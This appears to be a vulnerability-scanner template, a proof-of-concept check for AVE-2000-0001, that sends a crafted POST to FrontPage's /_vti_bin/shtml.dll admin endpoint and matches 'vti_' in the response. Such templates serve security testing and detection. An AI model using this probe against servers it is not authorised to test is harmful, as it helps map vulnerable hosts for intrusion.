[info]
author = "ave"
description = "AVE-2000-0001 verification"
id = "POC-AVE-2000-0001"
name = "PoC for AVE-2000-0001"
severity = "medium"
tags = ["ave-2000-0001"]
vuln_id = ["AVE-2000-0001"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/_vti_bin/shtml.dll"
protocol = "http"

[poc.requests.body]
content = "method=server:admin&service=admin"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["vti_"]
